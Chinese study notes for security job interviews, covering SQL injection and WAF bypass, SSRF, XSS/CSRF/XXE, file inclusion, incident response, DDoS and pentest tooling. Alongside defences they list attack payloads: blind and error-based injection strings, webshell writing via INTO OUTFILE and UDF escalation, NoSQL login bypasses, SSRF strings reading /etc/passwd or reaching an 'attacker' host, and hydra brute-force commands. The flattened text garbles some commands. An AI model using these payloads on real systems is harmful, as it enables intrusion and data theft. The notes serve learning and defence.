Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏 有没有做过协议分析和抓包分析 mysql查看版本？ 过安全狗 编程能力/平台逆向/修改程序入口/rootkit有没有研究过 说一个印象深刻的CTF的题目 1234- Padding Oracle-&gt;CBC-&gt;密码学(RSA&#x2F;AES&#x2F;DSA&#x2F;SM)- CRC32- 反序列化漏洞 #### sql二次注入 第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列 123451. 暴库 &#96;group_concat(schema_name) from information_schema.schemata&#96;2. 暴表 &#96;group_concat(table_name) from information_schema.schemata where table_schema&#x3D;&#39;hhh&#39;&#96;3. 获取数据 &#96;concat(flag) from flag&#96; 修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。 ## 爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA） 并发(多线程、线程池、协程、三个程之间的区别) 进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。 常用的标准库 123456789101112131415161718192021222324252627282930313233343536* - ## functools- itertools 迭代器 - count&#x2F;cycle&#x2F;repeat - chain - groupby 把迭代器中相邻的重复元素挑出来放在一起- concurrent.futures - ThreadPoolExecutor- hashlib - md5 - sha1 - sha256 - sha512- logging- sys.argv argparse读取命令行参数- pickle 序列化工具- re 正则- collections 多种数据类型 - namedtuple - OrderedDict - Counter- os 系统相关的函数 DJANGO和FLASK区别和使用 RSA DES AES 国内SM系列风险评估流程 三要素 资产：资产价值 威胁：威胁主体、影响对象、出现频率、动机等 脆弱性：资产弱点的严重程度‘代码审计Fority SCA审计JAVA代码fortify用到什么模块? 过滤器 自定义规则 生成报告Seay审计PHP代码源码阅读应急响应具体流程模型 https://zhuanlan.zhihu.com/p/26542790PDCERF模型 Prepare（准备）：准备用来检测的工具和人 Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告 Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平 Eradication（根除） Recover（恢复） Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解实例DDOSDDOS是什么分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机实例我司网站www.catroot.cn的IP 223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。 https://www.zhihu.com/question/19581905 网络设备设施 拼带宽，加大带宽，但是成本太高 使用硬件防火墙 选用高性能设备 抗D思想和方案 负载均衡 花钱买流量清洗服务 CDN：web层，比如cc攻击 分布式集群防御 高防：防大部分攻击，udp、大型的cc攻击 预防为主 系统漏洞 系统资源优化： 过滤不必要的服务和端口 限制特定流量：检查访问来源做适当限制主机被入侵 优先提取易消失的数据 内存信息 free -m `htop 系统进程 ps top netstat ss 路由信息 tracert ifconfig查看网卡流量，检查网卡的发送、接收数据情况 NetHogs实时监控带宽占用状况 查看Linux系统日志 /var/log ClamAV杀毒软件渗透测试流程相关渗透测试流程 项目访谈 信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息 漏洞扫描：Nessus, AWVS 手动挖掘：逻辑漏洞 验证漏洞 修复建议 （如果有）基线检查/复验漏洞 输出报告 概述 测试基本信息 测试范围 测试时间 测试任务 测试过程 信息安全风险综合分析 整体风险分析 风险影响分析 系统安全分析 安全漏洞列表 解决方案建议 复测报告渗透测试项目用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。 如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。渗透测试具体实施17年OWASP TOP10 注入:sql,nosql,ldap,os 失效的身份认证: 敏感信息泄漏 XXE XML外部实体 失效的访问控制：管理页面仅能管理员权限访问；越权漏洞 安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用 XSS 不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆 使用含有已知漏洞的组件：比如structs2框架 不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应常见的Web安全漏洞 SQL注入 XSS 文件遍历、文件上传、文件下载 垂直越权、水平越权 逻辑漏洞挖过什么逻辑漏洞订单任意金额修改相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。预防思路： 订单需要多重效验 订单数值较大的时候需要人工审核验证码回传漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件预防思路： response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加 如果要进行前端验证的话也可以，但是需要进行加密未进行登陆凭证验证有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。预防思路： 对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证接口无限制枚举 某电商登陆接口无验证导致撞库 某招聘网验证码无限制枚举 某快递公司优惠券枚举 某电商会员卡卡号枚举预防思路： 在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。 注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。 验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。 优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。cookie设置存在缺陷 Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举. cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法 越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限预防思路 cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。 用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。 用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。 cookie中设定session参数，以防cookie可以长时间生效。 根据业务不同还有很多方法找回密码功能缺陷 单纯读取内存值作为用户凭证 电商系统加车、下单漏洞你常用的渗透工具有哪些，最常用的是哪个？扫描:Nessus,AWVS,NiktoSQLmap https://blog.csdn.net/ski_12/article/details/58188331常用参数 1234567891011121314151617181920-u 单个URL -m xx.txt 多个URL-d &quot;mysql:&#x2F;&#x2F;user:password@10.10.10.137:3306&#x2F;dvwa&quot; 作为服务器客户端，直接连接数据库--data post&#x2F;get都适用-p 指定扫描的参数-r 读取文件-f 指纹信息--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host等等http头的修改--threads 并发线程 默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level&#x3D;LEVEL 执行测试的等级（1-5，默认为 1）–risk&#x3D;RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险–current-db &#x2F; 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户 常用的tamper 本地：sqlmap-tamper分类.xlsx 123456base64encode.py #转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用&#x2F;**&#x2F;分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xx Nmap12345678910111213141516nmap hostname&#x2F;ip或者多个ip或者子网192.168.123.*-iL ip.txt 扫描ip.txt的所有ip-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描-O 探测操作系统信息-sV 查找主机服务版本号-sA 探测该主机是否使用了包过滤器或防火墙-sS 半开扫描，一般不会记入日志，不过需要root权限。-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-sN TCP空扫描-F 快速扫描-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-p 指定端口&#x2F;端口范围-oN 将报告写入文件-v 详细信息-T&lt;0-5&gt; 设定速度 Nmap还可以用到爆破等一些脚本123--script all 使用所有脚本--script&#x3D;sql.injection.nse sql注入--script&#x3D;&quot;smb*&quot; 扫smb系列 Metasploit使用内置模块。HR：常用的模块有哪些？ tcp反向链接 msfvenomHydra密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，12hydra IP -l loginname -P pass.txt PROTROCLhydra 127.0.0.1 -l root -P pass.txt ssh kali信息收集工具 dig whois host:查询dns服务器 nslookup 域名枚举：fierse -dns maltego onesixtyone流量分析WireSharkCTF描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)数据库注入 https://www.zhihu.com/question/22953267 MySQL面试题MySQL存储引擎？ InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束 为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在 SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合 InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上 InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键 MyISAM：访问速度快，不支持事务，逐渐被淘汰 MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。information_schema用的是该引擎 MERGE、Archive等等不常用的什么是事务？事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。 举个银行应用的典型例子：假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤：a.检查A的支票账户余额高于2000元；b.从A的支票账户余额中减去2000元；c.在A的储蓄账户余额中增加2000元。这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。读锁和写锁读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。MySQL的索引索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。ORDER BY在注入的运用GPC是什么？GPC之后怎么绕过？如果magic_quotes_gpc=On，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。Mysql一个@和两个@什么区别 @为用户变量，使用SET @var1=1赋值 @@ 为系统变量 ，包括全局变量show global variables \\G;和会话变量show session variables \\G;注入/绕过常用的函数 基于布尔SQL盲注 left(database(),1)&gt;&#39;s&#39; ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ ascii(substr((select database()),1,1))=98 ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23 regexp正则注入 select user() regexp &#39;^[a-z]&#39;; select user() like &#39;ro%&#39; 基于报错的SQL盲注 Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;MySQL存储过程各种写shell的问题 写shell用什么函数？ select &#39; into outfile &#39;D:/shelltest.php&#39; dumpfile file_put_contents outfile不能用了怎么办？ select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&#39;;可以UDF提权 https://www.cnblogs.com/milantgh/p/5444398.html dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。 sleep()能不能写shell？ 写shell的条件？ 用户权限 目录读写权限 防止命令执行：disable_functions，禁止了disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source，但是可以用dl扩展执行命令或者ImageMagick漏洞 https://www.waitalone.cn/imagemagic-bypass-disable_function.html open_basedir: 将用户可操作的文件限制在某目录下注入类型 基于报错注入 基于布尔的注入，根据返回页面判断条件真假的注入 基于时间的盲注，不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 宽字节注入 联合查询，可以使用 union 的情况下的注入。 堆查询注入，可以同时执行多条语句的执行时的注入。SQL注入的原理通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通常未经检查或者未经充分检查的用户输入数据或代码编写问题，意外变成了代码被执行。过waf https://blog.csdn.net/wjy397/article/details/53263281 确定waf类型，狗、盾、神、锁、宝、卫士 使用注释符号或者特殊符号或者多个特殊符号重复1234567891011121314151617# ---- - &#x2F;&#x2F;5.6.12特性，需要加空格--+&#x2F;&#x2F;&#x2F;**&#x2F; &#x2F;&#x2F;c风格注释&#x2F;**&#x2F;&#x2F;**&#x2F; &#x2F;&#x2F;多个注释&#x2F;*letmetest*&#x2F;;# 科学记数法id&#x3D;0e1union select# 空白字符SQLite3 0A 0D 0C 09 20 MySQL5 09 0A 0B 0C 0D A0 20 PosgresSQL 0A 0D 0C 09 20 Oracle 11g 00 0A 0D 0C 09 20 MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 使用sql内置函数或者关键字 报错注入 https://blog.csdn.net/like98k/article/details/79646512 1234567891011121314151617181920212223# 常用extractvalueupdatexml 报错注入UPDATEXML (XML_document, XPath_string, new_value); or updatexml(1, concat(0x7e, (version()), 0x7e), 0);&gt; select * from users where id &#x3D; 1 and updatexml(1, concat(0x7e, (version()), 0x7e), 0);&gt; version() database() (SELECT concat(column_name) FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39; limit 0,1floor()ceil()Mid(version(),1,1)Substr(version(),1,1)Substring(version(),1,1)concat(version(),&#39;|&#39;,user());concat_ws(&#39;|&#39;,1,2,3)Char(49)Hex(&#39;a&#39;)Unhex(61)过滤了逗号(1)limit处的逗号：limit 1 offset 0(2)字符串截取处的逗号mid处的逗号：mid(version() from 1 for 1) 利用容器特性，比如iis+asp的环境可能会吞掉%(f%rom-&gt;from)造成注入，或者iis支持unicode解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf可能不会拦截造成注入 畸形协议/请求。asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式;php+apache解析协议除了get/post外随便定义协议也可能过 %0a换行 多次URL编码，waf的一根筋过滤12345678unlencodebase64jsonbinaryquerystringhtmlencodeunicodephp serialize http参数污染，id=1&amp;id=2&amp;id=3 id=1,2,3如何进行SQL注入的防御 关闭应用的错误提示 加waf 对输入进行过滤 限制输入长度 限制好数据库权限，drop/create/truncate等权限谨慎grant 预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。 数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5 清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。 具体的语言如何进行防注入，采用什么安全框架 作者：没啥意思 链接：https://www.zhihu.com/question/22953267/answer/23222069 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。 mysql的网站注入，5.0以上和5.0以下有什么区别？10年前就出了5.0，现在都到5.7了，没啥意义的问题 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。 5.0以下是多用户单操作，5.0以上是多用户多操做。SQL和NoSQL的区别SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库SQL优点关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。 结构稳定，不易修改，常用联表查询 查询能力高，可以操作很复杂的查询 一致性高，处理数据会使用封锁保证数据不被改变 表具有逻辑性，易于理解SQL缺点 不适用高并发读写 不适用海量数据高效读写 层次多，扩展性低 维护一致性开销大 涉及联表查询，复杂，慢NoSQL优点采用键值对存储数据 由于数据之间没有关系，所以易扩展，也易于查询 数据结构灵活，每个数据都可以有不同的结构 由于降低了一致性的要求，所以查询速度更快比较非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。MongoDB注入方式利用正则：找到y开头的name db.items.find({name: {$regex: &quot;^y&quot;}})一些payload ?login[$regex]=^&amp;password[$regex]=^ ?login[$not][$type]=1&amp;password[$not][$type]=1XSS CSRF XXECSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ xss学习 https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。 CSRF、SSRF和重放攻击有什么区别？ CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的啥是同源策略，跨域有几种方式？ http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html浏览器安全的基石是”同源政策”，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制： - Cookie、LocalStorage 和 IndexDB 无法读取。 - DOM 无法获得。 - AJAX 请求不能发送 如何规避同源策略？JSONP向服务器请求json数据回调，一般请求URL会加上&amp;callback=xx123foo(&#123; &quot;ip&quot;: &quot;8.8.8.8&quot;&#125;); 由于``元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。JSONP的劫持 http://blog.knownsec.com/2015/03/jsonp_security_technic/防御： 验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行 随机token WebSocketWebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。CORS(重点) http://www.ruanyifeng.com/blog/2016/04/cors.htmlCORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。 CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出Acess-Control-Allow-*的字段 与JSONP的比较CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？ https://www.zhihu.com/question/26628342存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子； CSP策略 https://www.zhihu.com/question/21979782 浏览器内容安全策略，减少xss攻击。 SSRF漏洞原理是什么？利用时有哪些伪协议？ secpulse.com/archives/65832.html 漏洞原理利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。ssrf用处 探测内网信息,用协议探ftp%26ip={ip}%26port={port} 攻击内网或本地其他服务 穿透防火墙漏洞处 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 在线处理工具举几个例子： 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。 邮件系统就是接收邮件服务器地址这些地方。 文件就找ImageMagick，xml这些。 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。绕过姿势 http://example.com@127.0.0.1 利用IP地址的省略写法绕过,[::]绕过localhost DNS解析 http://127.0.0.1.xip.io/ 可以指向任意ip的域名：xip.io 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过利用协议 https://www.secpulse.com/archives/70471.html接受ua为curl的时候，支持的协议有 使用curl -v http://xx.com/ssrf.php?url=sxxx 123456789101112file:&#x2F;&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwordDict:&#x2F;&#x2F;dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;SFTP:&#x2F;&#x2F;ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;TFTP:&#x2F;&#x2F;ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKETLDAP:&#x2F;&#x2F;ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquitGopher:&#x2F;&#x2F; 漏洞修复 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html 检查是否为内网IP地址 绕过方法: 利用八进制IP地址绕过 利用十六进制IP地址绕过 利用十进制的IP地址绕过 利用IP地址的省略写法绕过 最好的做法：IP地址转换为整数再进行判断 获取真正请求的host 如何正确的获取用户输入的URL的Host？ 最常见的就是，使用http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname 只要Host只要不是内网IP即可吗？ host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查 只要Host指向的IP不是内网IP即可吗？ 不一定，可能会30x跳转归纳 解析目标URL，获取其Host 解析Host，获取Host指向的IP地址 检查IP地址是否为内网IP 请求URL 如果有跳转，拿出跳转URL，执行1在浏览器端，Referer可以篡改吗？通过插件修改，一般抓包修改xss盲打到内网服务器的利用xss代码层防御文件上传下载遍历漏洞原理 容器漏洞，解析漏洞修复方案文件包含漏洞 https://blog.csdn.net/fuckcat_2333/article/details/52132559 类型 本地文件包含 远程文件包含 ：即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。PHP文件包含函数 include() ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 inclue_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。利用 读取敏感文件 远程包含shell 图片上传并包含图片shenll 使用伪协议 包含日志文件GetShell 截断包含修复方案 禁止远程文件包含 allow_url_include=off 配置 open_basedir=指定目录，限制访问区域。 过滤../等特殊符号 修改Apache日志文件的存放地址 开启魔术引号 magic_quotes_qpc=on 尽量不要使用动态变量调用文件，直接写要包含的文件。web框架漏洞弱点服务端注入之Flask框架中服务端模板注入问题 http://www.freebuf.com/articles/web/135953.html HTTP协议TCP三次握手四次挥手三次握手 客户端 syn 发送到服务端，变成 SYN_SENT 状态 服务端 ack=syn+1 回传syn到客户端，变成SYN_RECV状态 客户端 ack=syn+1， 变成ESTABLISHED状态，传输给服务端 服务端收到ACK后变成ESTABLISHED状态，建立连接SYN标志位为表示请求连接，ACK表示确认四次挥手客户端=主动关闭方 客户端FIN-&gt;服务端 服务端ACK=FIN+1-&gt;客户端，服务端到客户端的连接关闭 服务端FIN-&gt;客户端 